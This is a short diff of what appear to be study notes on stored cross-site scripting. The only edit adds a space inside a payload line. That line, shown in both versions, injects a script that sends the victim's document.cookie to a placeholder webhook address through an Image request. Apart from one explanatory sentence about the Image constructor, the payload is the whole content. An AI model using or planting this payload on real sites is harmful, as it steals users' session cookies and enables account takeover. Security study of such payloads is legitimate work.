@@ -12,7 +12,7 @@ stored xss
 ```
 
 ```html
-</p><script>var i=new Image;i.src="webHookAddress/?"+document.cookie;</script>
+</p><script>var i=new Image; i.src="webHookAddress/?"+document.cookie;</script>
 ```
 
 new Image() contructor create an image object
